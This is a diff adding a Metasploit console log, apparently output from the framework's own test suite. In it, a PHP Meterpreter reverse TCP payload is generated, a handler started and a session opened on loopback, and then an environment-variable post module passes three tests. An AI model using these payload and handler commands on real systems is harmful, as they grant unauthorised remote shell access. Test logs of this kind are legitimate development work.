@@ -1,0 +1,22 @@
+use php/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> generate -o /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-1u1d0hh.php -f raw lport=6037 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3336-1u1d0hh.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 32
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6037 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 33 opened (127.0.0.1:6037 -> 127.0.0.1:35344 ) at 2022-01-19 11:05:48 +0000
+use test/get_env
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> run session=33 addentropy=true verbose=true
+
+[*] Running against session 33
+[*] Session type is meterpreter and platform is linux
+[+] should return user
+[+] should handle $ sign
+[+] should return multiple envs
+[*] Testing complete in 0.004545991
+[*] Passed: 3; Failed: 0
+[*] Post module execution completed
